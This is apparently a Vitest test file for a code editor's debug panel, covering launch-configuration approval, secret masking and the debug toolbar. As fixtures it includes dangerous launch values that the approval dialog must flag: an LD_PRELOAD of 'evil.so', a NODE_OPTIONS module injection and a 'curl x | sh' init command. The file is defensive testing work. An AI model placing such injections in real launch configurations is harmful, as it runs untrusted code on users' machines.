// @vitest-environment happy-dom

import { act } from 'react'
import { createRoot } from 'react-dom/client'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { DebugApi, DebugLaunchPreview, DebugSnapshot } from '../../../../preload/api/debug-api'
import { createDebugClient } from '@/lib/debug/debug-client'
import { createDebugSessionStore } from '@/lib/debug/use-debug-session'

type PanelTestState = {
  repos?: { id: string; displayName: string }[]
  activeWorktreeId: string | null
  worktreesByRepo: Record<string, { id: string; path: string }[]>
  settings: { debugEnabledRepos: string[] }
  activeFileId: string | null
  openFiles: unknown[]
  updateSettings: ReturnType<typeof vi.fn>
  openSettingsPage: ReturnType<typeof vi.fn>
  openSettingsTarget: ReturnType<typeof vi.fn>
}

const mocks = await vi.hoisted(async () => {
  const { create } = await import('zustand')
  return {
    store: create<PanelTestState>(() => ({
      activeWorktreeId: null,
      worktreesByRepo: {},
      settings: { debugEnabledRepos: [] },
      activeFileId: null,
      openFiles: [],
      updateSettings: vi.fn(),
      openSettingsPage: vi.fn(),
      openSettingsTarget: vi.fn()
    }))
  }
})

vi.mock('@/i18n/i18n', () => ({
  translate: (_key: string, fallback: string, options?: Record<string, string>) =>
    fallback.replace(/\{\{(\w+)\}\}/g, (_m, name: string) => options?.[name] ?? '')
}))
vi.mock('@/store', () => ({ useAppStore: mocks.store }))

const { DebugPanel } = await import('./DebugPanel')
const { runDebugKeybinding } = await import('@/app-shell/use-debug-keybindings')
const { requestRunAndDebug } = await import('@/lib/debug/debug-open-request')

const WORKTREE = '/repo/a'
const TARGET = { repoId: 'repo-1', worktreePath: WORKTREE }

function snapshot(overrides: Partial<DebugSnapshot> = {}): DebugSnapshot {
  return {
    seq: 1,
    worktreePath: WORKTREE,
    status: 'idle',
    configName: null,
    adapterId: null,
    capabilities: {},
    stopped: null,
    threads: [],
    breakpoints: [],
    exceptionFilters: { available: [], enabled: [] },
    lastError: null,
    ...overrides
  }
}

function preview(overrides: Partial<DebugLaunchPreview> = {}): DebugLaunchPreview {
  return {
    name: 'Run app',
    configHash: 'cfg',
    expectedHash: 'hash-1',
    runs: {
      program: '${workspaceFolder}/app.py',
      args: ['--port', '8000'],
      cwd: WORKTREE,
      module: undefined,
      python: undefined,
      runtimeExecutable: undefined,
      runtimeArgs: undefined,
      envFile: undefined,
      processId: undefined,
      host: undefined,
      port: undefined,
      adapterBinary: '/usr/bin/python3',
      adapterArgs: ['-m', 'debugpy.adapter'],
      adapterRepoLocal: false,
      env: [
        { name: 'API_KEY', value: '••••••', masked: true, dangerous: false },
        {
          name: 'LD_PRELOAD',
          value: 'evil.so',
          masked: false,
          dangerous: true
        }
      ],
      allKeys: [],
      envFileEntries: []
    },
    adapter: {
      id: 'debugpy',
      binaryPath: '/usr/bin/python3',
      args: ['-m', 'debugpy.adapter'],
      approvalKey: 'key',
      repoLocal: false
    },
    approved: { repo: true, adapter: false, launch: false },
    ...overrides
  }
}

const ok = <T,>(value: T): Promise<{ ok: true; value: T }> => Promise.resolve({ ok: true, value })

function fakeBridge() {
  return {
    describeAdapters: vi.fn<DebugApi['describeAdapters']>(() =>
      ok([
        {
          adapterId: 'debugpy',
          label: 'Python',
          languages: ['python'],
          transport: 'stdio',
          binaryPath: '/usr/bin/python3',
          args: ['-m', 'debugpy.adapter'],
          approvalKey: 'key',
          repoLocal: false,
          hint: null
        }
      ])
    ),
    listConfigs: vi.fn<DebugApi['listConfigs']>(() =>
      ok([
        {
          name: 'Run app',
          kind: 'configuration',
          type: 'debugpy',
          request: 'launch',
          adapterId: 'debugpy',
          runnable: true
        },
        {
          name: 'Both',
          kind: 'compound',
          type: '',
          request: '',
          adapterId: null,
          runnable: false,
          refusal: 'Compound configurations are not supported.'
        }
      ])
    ),
    previewLaunch: vi.fn<DebugApi['previewLaunch']>(() => ok(preview())),
    approveLaunch: vi.fn<DebugApi['approveLaunch']>(() =>
      ok(preview({ approved: { repo: true, adapter: true, launch: true } }))
    ),
    start: vi.fn<DebugApi['start']>(() => ok(snapshot({ status: 'running', seq: 2 }))),
    stop: vi.fn<DebugApi['stop']>(() => ok(snapshot({ status: 'terminated', seq: 9 }))),
    restart: vi.fn<DebugApi['restart']>(() => ok(snapshot({ status: 'starting', seq: 9 }))),
    continue: vi.fn<DebugApi['continue']>(() => ok(null)),
    next: vi.fn<DebugApi['next']>(() => ok(null)),
    stepIn: vi.fn<DebugApi['stepIn']>(() => ok(null)),
    stepOut: vi.fn<DebugApi['stepOut']>(() => ok(null)),
    pause: vi.fn<DebugApi['pause']>(() => ok(null)),
    threads: vi.fn<DebugApi['threads']>(() => ok([])),
    stackTrace: vi.fn<DebugApi['stackTrace']>(() => ok({ stackFrames: [] })),
    scopes: vi.fn<DebugApi['scopes']>(() => ok([])),
    variables: vi.fn<DebugApi['variables']>(() => ok([])),
    evaluate: vi.fn<DebugApi['evaluate']>(() => ok({ result: '', variablesReference: 0 })),
    setVariable: vi.fn<DebugApi['setVariable']>(() =>
      ok({ name: '', value: '', variablesReference: 0 })
    ),
    setExceptionFilters: vi.fn<DebugApi['setExceptionFilters']>(() => ok(snapshot())),
    addBreakpoint: vi.fn<DebugApi['addBreakpoint']>(),
    updateBreakpoint: vi.fn<DebugApi['updateBreakpoint']>(),
    removeBreakpoint: vi.fn<DebugApi['removeBreakpoint']>(() => ok(null)),
    setFileLines: vi.fn<DebugApi['setFileLines']>(() => ok([])),
    listBreakpoints: vi.fn<DebugApi['listBreakpoints']>(() => ok([])),
    snapshot: vi.fn<DebugApi['snapshot']>(() => ok(snapshot())),
    eventsSince: vi.fn<DebugApi['eventsSince']>(() =>
      ok({ events: [], latestSeq: 0, truncated: false })
    ),
    subscribe: vi.fn<DebugApi['subscribe']>(() => ok(null)),
    onState: vi.fn<DebugApi['onState']>(() => () => {}),
    onOutput: vi.fn<DebugApi['onOutput']>(() => () => {})
  } satisfies DebugApi
}

let bridge: ReturnType<typeof fakeBridge>
let container: HTMLDivElement
let root: ReturnType<typeof createRoot>

beforeEach(() => {
  bridge = fakeBridge()
  mocks.store.setState({
    activeWorktreeId: `repo-1::${WORKTREE}`,
    worktreesByRepo: {
      'repo-1': [{ id: `repo-1::${WORKTREE}`, path: WORKTREE }]
    },
    settings: { debugEnabledRepos: ['repo-1'] },
    activeFileId: null,
    openFiles: [],
    updateSettings: vi.fn(),
    openSettingsPage: vi.fn(),
    openSettingsTarget: vi.fn()
  })
  container = document.createElement('div')
  document.body.appendChild(container)
  root = createRoot(container)
})

afterEach(async () => {
  await act(async () => root.unmount())
  container.remove()
})

async function renderPanel() {
  const client = createDebugClient(() => bridge)
  const store = createDebugSessionStore(client)
  await act(async () => {
    root.render(
      <DebugPanel client={client} store={store}>
        <div data-testid="sections">sections</div>
      </DebugPanel>
    )
  })
  return { client, store }
}

const button = (label: string): HTMLButtonElement | undefined =>
  [...container.querySelectorAll('button')].find(
    (b) => b.getAttribute('aria-label') === label || b.textContent?.trim() === label
  )

async function click(label: string): Promise<void> {
  const target = button(label)
  expect(target, `button ${label}`).toBeDefined()
  await act(async () => target?.click())
}

describe('DebugPanel', () => {
  it('shows the off state with Allow and Open Settings when the repo is not enabled', async () => {
    mocks.store.setState({ settings: { debugEnabledRepos: [] } })
    await renderPanel()

    expect(container.textContent).toContain('Debugging is off for this repository')
    expect(button('Start Debugging')).toBeUndefined()
    await click('Allow debugging for this repository')
    expect(mocks.store.getState().updateSettings).toHaveBeenCalledWith({
      debugEnabledRepos: ['repo-1']
    })
    await click('Open Settings')
    expect(mocks.store.getState().openSettingsPage).toHaveBeenCalled()
  })

  it("shows core's refusal instead of a picker for an SSH or runtime worktree", async () => {
    bridge.listConfigs.mockResolvedValue({
      ok: false,
      reason: 'remote-workspace',
      message: 'Debugging is not supported for SSH workspaces.'
    })
    await renderPanel()

    expect(container.textContent).toContain('Debugging is not supported for SSH workspaces.')
    expect(container.querySelector('[role="radiogroup"]')).toBeNull()
    expect(button('Start Debugging')).toBeUndefined()
  })

  it('disables a refused row and shows its reason', async () => {
    await renderPanel()

    const rows = [...container.querySelectorAll<HTMLButtonElement>('[role="radio"]')]
    const compound = rows.find((row) => row.textContent?.includes('Both'))
    expect(compound?.disabled).toBe(true)
    expect(compound?.textContent).toContain('Compound configurations are not supported.')
    expect(rows.find((row) => row.textContent?.includes('Run app'))?.disabled).toBe(false)
    expect(container.textContent).toContain('sections')
  })

  it('offers "Debug current file" only when the active file language has a default', async () => {
    mocks.store.setState({
      activeFileId: 'f',
      openFiles: [
        {
          id: 'f',
          filePath: `${WORKTREE}/main.py`,
          relativePath: 'main.py',
          worktreeId: `repo-1::${WORKTREE}`,
          language: 'python',
          mode: 'edit'
        }
      ]
    })
    await renderPanel()
    expect(container.textContent).toContain('Debug current file')
    expect(container.textContent).toContain('main.py')
  })

  it('shows a malformed launch.json error with its line:column and no Start button', async () => {
    bridge.listConfigs.mockResolvedValue({
      ok: false,
      reason: 'malformed',
      message: 'launch.json 4:7: Expected comma'
    })
    await renderPanel()

    expect(container.textContent).toContain('launch.json 4:7: Expected comma')
    expect(button('Start Debugging')).toBeUndefined()
  })

  it('confirms with the adapter, program and env keys, never a masked value', async () => {
    await renderPanel()
    await click('Start Debugging')

    const dialog = container.querySelector('[role="dialog"]')
    const text = dialog?.textContent ?? ''
    expect(text).toContain('"/usr/bin/python3" "-m" "debugpy.adapter"')
    expect(text).toContain('${workspaceFolder}/app.py')
    expect(text).toContain('"--port" "8000"')
    expect(text).toContain('API_KEY')
    expect(text).toContain('(masked)')
    expect(text).not.toContain('••••••')
    expect(text).toContain('LD_PRELOAD')
    expect(dialog?.querySelector('[aria-label="Changes how programs load code"]')).not.toBeNull()
    expect(bridge.start).not.toHaveBeenCalled()
  })

  it('warns when the adapter binary lives inside the repo', async () => {
    const base = preview()
    bridge.previewLaunch.mockResolvedValue({
      ok: true,
      value: { ...base, adapter: { ...base.adapter, repoLocal: true } }
    })
    await renderPanel()
    await click('Start Debugging')
    expect(container.textContent).toContain('The adapter binary is inside this repository')
  })

  it("Start approves with previewLaunch's hash, then starts with the same hash", async () => {
    const order: string[] = []
    bridge.approveLaunch.mockImplementation(async () => {
      order.push('approve')
      return { ok: true, value: preview() }
    })
    bridge.start.mockImplementation(async () => {
      order.push('start')
      return { ok: true, value: snapshot({ status: 'running', seq: 2 }) }
    })
    await renderPanel()
    await click('Start Debugging')
    const dialog = container.querySelector('[role="dialog"]')
    const confirm = [...(dialog?.querySelectorAll('button') ?? [])].find(
      (b) => b.textContent === 'Start'
    )
    await act(async () => confirm?.click())

    expect(order).toEqual(['approve', 'start'])
    const expected = {
      ...TARGET,
      configName: 'Run app',
      expectedHash: 'hash-1'
    }
    expect(bridge.approveLaunch).toHaveBeenCalledWith(expect.objectContaining(expected))
    expect(bridge.start).toHaveBeenCalledWith(expect.objectContaining(expected))
    expect(container.querySelector('[role="dialog"]')).toBeNull()
  })

  it('Cancel approves and starts nothing', async () => {
    await renderPanel()
    await click('Start Debugging')
    await click('Cancel')

    expect(bridge.approveLaunch).not.toHaveBeenCalled()
    expect(bridge.start).not.toHaveBeenCalled()
    expect(container.querySelector('[role="dialog"]')).toBeNull()
  })

  it('re-runs the preview when the launch changed since it was shown', async () => {
    bridge.approveLaunch.mockResolvedValueOnce({
      ok: false,
      reason: 'changed-since-preview',
      message: '"Run app" changed since it was previewed.'
    })
    await renderPanel()
    await click('Start Debugging')
    const confirm = [
      ...container.querySelectorAll<HTMLButtonElement>('[role="dialog"] button')
    ].find((b) => b.textContent === 'Start')
    await act(async () => confirm?.click())

    expect(bridge.previewLaunch).toHaveBeenCalledTimes(2)
    expect(bridge.start).not.toHaveBeenCalled()
    expect(container.textContent).toContain('changed since you last looked')
  })

  it("shows a failed start's refusal in the panel", async () => {
    bridge.previewLaunch.mockResolvedValue({
      ok: true,
      value: preview({ approved: { repo: true, adapter: true, launch: true } })
    })
    bridge.start.mockResolvedValue({
      ok: false,
      reason: 'adapter-not-found',
      message: 'debugpy is not installed for /usr/bin/python3.'
    })
    await renderPanel()
    await click('Start Debugging')

    expect(container.querySelector('[role="alert"]')?.textContent).toBe(
      'debugpy is not installed for /usr/bin/python3.'
    )
  })
  it('a worktree-list refresh with the same worktree keeps the sections mounted and fetches no new snapshot', async () => {
    await renderPanel()
    const before = bridge.snapshot.mock.calls.length
    const sections = container.querySelector('[data-testid="sections"]')
    expect(sections).not.toBeNull()
    // A refresh rebuilds worktreesByRepo with equal contents but new object identities.
    await act(async () => {
      mocks.store.setState({
        worktreesByRepo: { 'repo-1': [{ id: `repo-1::${WORKTREE}`, path: WORKTREE }] }
      })
    })
    expect(bridge.snapshot.mock.calls.length).toBe(before)
    expect(container.querySelector('[data-testid="sections"]')).toBe(sections)
  })
})

describe('DebugLaunchConfirm', () => {
  const confirmText = (): string => container.querySelector('[role="dialog"]')?.textContent ?? ''

  it('lists every key the adapter receives and the env file contents, flagging dangerous ones', async () => {
    const base = preview()
    // Core sends these beside the preload wire type's fields.
    const runs = {
      ...base.runs,
      allKeys: [
        { name: 'initCommands', value: '["platform shell curl x | sh"]', dangerous: true },
        { name: 'pid', value: '1234', dangerous: false }
      ],
      envFileEntries: [
        { name: 'DB_TOKEN', value: '••••••', masked: true, dangerous: false },
        { name: 'NODE_OPTIONS', value: '--require ./x.js', masked: false, dangerous: true }
      ]
    }
    bridge.previewLaunch.mockResolvedValue({ ok: true, value: { ...base, runs } })
    await renderPanel()
    await click('Start Debugging')
    const dialog = container.querySelector('[role="dialog"]')
    expect(confirmText()).toContain('platform shell curl x | sh')
    const flagged = dialog?.querySelector('[data-dangerous]')
    expect(flagged?.textContent).toContain('initCommands')
    expect(flagged?.querySelector('[aria-label="Runs commands or binaries"]')).not.toBeNull()
    expect(confirmText()).toContain('Env file contents')
    expect(confirmText()).toContain('NODE_OPTIONS')
    expect(confirmText()).toContain('--require ./x.js')
    expect(confirmText()).not.toContain('••••••')
  })

  it('names the approval-bound adapter and quotes each argument', async () => {
    const base = preview()
    bridge.previewLaunch.mockResolvedValue({
      ok: true,
      value: {
        ...base,
        runs: { ...base.runs, adapterBinary: '/elsewhere/python', args: ['--x y'] },
        adapter: {
          ...base.adapter,
          binaryPath: '/venv/bin/python',
          args: ['-m', 'debugpy.adapter']
        }
      }
    })
    await renderPanel()
    await click('Start Debugging')
    expect(confirmText()).toContain('"/venv/bin/python" "-m" "debugpy.adapter"')
    expect(confirmText()).not.toContain('/elsewhere/python')
    expect(confirmText()).toContain('"--x y"')
    expect(confirmText()).not.toContain('"--x" "y"')
  })

  it('names the workspace, and a switch to another worktree drops the confirmation', async () => {
    mocks.store.setState({
      repos: [{ id: 'repo-1', displayName: 'Shop' }],
      worktreesByRepo: {
        'repo-1': [
          { id: `repo-1::${WORKTREE}`, path: WORKTREE },
          { id: 'repo-1::/repo/b', path: '/repo/b' }
        ]
      }
    })
    await renderPanel()
    await click('Start Debugging')
    expect(confirmText()).toContain(`Shop — ${WORKTREE}`)
    await act(async () => mocks.store.setState({ activeWorktreeId: 'repo-1::/repo/b' }))
    expect(container.querySelector('[role="dialog"]')).toBeNull()
    expect(bridge.approveLaunch).not.toHaveBeenCalled()
  })

  it('F5 with an unapproved selected config opens the confirmation', async () => {
    const { client, store } = await renderPanel()
    await act(() =>
      runDebugKeybinding('debug.startOrContinue', {
        client,
        store,
        openRunAndDebug: requestRunAndDebug
      })
    )
    expect(confirmText()).toContain('Run “Run app”?')
    expect(bridge.start).not.toHaveBeenCalled()
    expect(bridge.previewLaunch).toHaveBeenLastCalledWith(
      expect.objectContaining({ ...TARGET, configName: 'Run app' })
    )
  })

  it("F5 with an approved selected config starts with the preview's expectedHash", async () => {
    bridge.previewLaunch.mockResolvedValue({
      ok: true,
      value: preview({ approved: { repo: true, adapter: true, launch: true } })
    })
    const { client, store } = await renderPanel()
    await act(() =>
      runDebugKeybinding('debug.startOrContinue', {
        client,
        store,
        openRunAndDebug: requestRunAndDebug
      })
    )
    expect(bridge.start).toHaveBeenCalledWith(
      expect.objectContaining({ ...TARGET, configName: 'Run app', expectedHash: 'hash-1' })
    )
    expect(container.querySelector('[role="dialog"]')).toBeNull()
  })

  it('a confirmation request sent before the panel mounted is shown on mount', async () => {
    requestRunAndDebug({ configName: 'Run app', confirm: true })
    await renderPanel()
    await act(async () => {})
    expect(confirmText()).toContain('Run “Run app”?')
  })
})

describe('DebugPanel errors', () => {
  it('shows a rejected listing instead of loading forever', async () => {
    bridge.listConfigs.mockRejectedValue(new Error('bridge gone'))
    bridge.describeAdapters.mockRejectedValue(new Error('bridge gone'))
    const client = createDebugClient(() => bridge)
    // The client turns rejections into refusals; prove the panel copes with a raw rejection too.
    const raw = { ...client, listConfigs: () => Promise.reject(new Error('bridge gone')) }
    await act(async () => {
      root.render(<DebugPanel client={raw} store={createDebugSessionStore(client)} />)
    })
    expect(container.textContent).toContain('bridge gone')
    expect(container.textContent).not.toContain('Loading launch configurations')
  })

  it('Allow is disabled while saving and shows a failed save', async () => {
    let fail: (error: Error) => void = () => {}
    mocks.store.setState({
      settings: { debugEnabledRepos: [] },
      updateSettings: vi.fn(() => new Promise((_resolve, reject) => (fail = reject)))
    })
    await renderPanel()
    await click('Allow debugging for this repository')
    expect(button('Allow debugging for this repository')?.disabled).toBe(true)
    await act(async () => fail(new Error('disk full')))
    expect(container.querySelector('[role="alert"]')?.textContent).toContain('disk full')
    expect(button('Allow debugging for this repository')?.disabled).toBe(false)
  })

  it('arrow keys move the picker selection, skipping refused rows', async () => {
    bridge.listConfigs.mockResolvedValue({
      ok: true,
      value: ['A', 'Refused', 'B'].map((name) => ({
        name,
        kind: 'configuration' as const,
        type: 'debugpy',
        request: 'launch',
        adapterId: 'debugpy',
        runnable: name !== 'Refused'
      }))
    })
    await renderPanel()
    const radios = () => [...container.querySelectorAll<HTMLButtonElement>('[role="radio"]')]
    expect(radios().map((r) => r.tabIndex)).toEqual([0, -1, -1])
    const group = container.querySelector('[role="radiogroup"]')
    await act(async () =>
      group?.dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowDown', bubbles: true }))
    )
    expect(radios().map((r) => r.getAttribute('aria-checked'))).toEqual(['false', 'false', 'true'])
    expect(radios().map((r) => r.tabIndex)).toEqual([-1, -1, 0])
    expect(document.activeElement).toBe(radios()[2])
  })
})

describe('DebugToolbar', () => {
  const stopped = snapshot({
    status: 'stopped',
    seq: 3,
    stopped: { reason: 'breakpoint', threadId: 7, allThreadsStopped: true },
    threads: [{ id: 7, name: 'main' }]
  })
  const running = snapshot({
    status: 'running',
    seq: 3,
    threads: [{ id: 7, name: 'main' }]
  })
  const thread = { ...TARGET, threadId: 7 }

  it.each([
    ['Continue', 'continue', thread],
    ['Step Over', 'next', thread],
    ['Step Into', 'stepIn', thread],
    ['Step Out', 'stepOut', thread],
    ['Restart', 'restart', TARGET],
    ['Stop', 'stop', TARGET]
  ] as const)('%s calls %s while paused', async (label, method, params) => {
    bridge.snapshot.mockResolvedValue({ ok: true, value: stopped })
    await renderPanel()

    const target = button(label)
    expect(target?.disabled).toBe(false)
    expect(target?.title).toMatch(new RegExp(`^${label} \\(.+\\)$`))
    await click(label)
    expect(bridge[method]).toHaveBeenCalledWith(params)
  })

  it('Pause calls pause while running, and stepping is disabled', async () => {
    bridge.snapshot.mockResolvedValue({ ok: true, value: running })
    await renderPanel()

    expect(button('Continue')).toBeUndefined()
    for (const label of ['Step Over', 'Step Into', 'Step Out']) {
      expect(button(label)?.disabled).toBe(true)
    }
    expect(button('Restart')?.disabled).toBe(false)
    expect(button('Stop')?.disabled).toBe(false)
    await click('Pause')
    expect(bridge.pause).toHaveBeenCalledWith(thread)
  })

  it('disables every control but Stop while starting, and renders children below', async () => {
    bridge.snapshot.mockResolvedValue({
      ok: true,
      value: snapshot({ status: 'starting', seq: 3 })
    })
    await renderPanel()

    for (const label of ['Pause', 'Step Over', 'Step Into', 'Step Out', 'Restart']) {
      expect(button(label)?.disabled).toBe(true)
    }
    expect(button('Stop')?.disabled).toBe(false)
    const toolbar = container.querySelector('[role="toolbar"]')
    const sections = container.querySelector('[data-testid="sections"]')
    expect(toolbar && sections && toolbar.compareDocumentPosition(sections)).toBe(
      Node.DOCUMENT_POSITION_FOLLOWING
    )
  })

  it('disables the other controls while one is pending, but never Stop', async () => {
    bridge.snapshot.mockResolvedValue({ ok: true, value: stopped })
    bridge.next.mockImplementation(() => new Promise(() => {}))
    await renderPanel()
    await click('Step Over')
    for (const label of ['Continue', 'Step Over', 'Step Into', 'Step Out', 'Restart']) {
      expect(button(label)?.disabled, label).toBe(true)
    }
    expect(button('Stop')?.disabled).toBe(false)
  })

  it('shows no toolbar without a live session', async () => {
    await renderPanel()
    expect(container.querySelector('[role="toolbar"]')).toBeNull()
  })
})
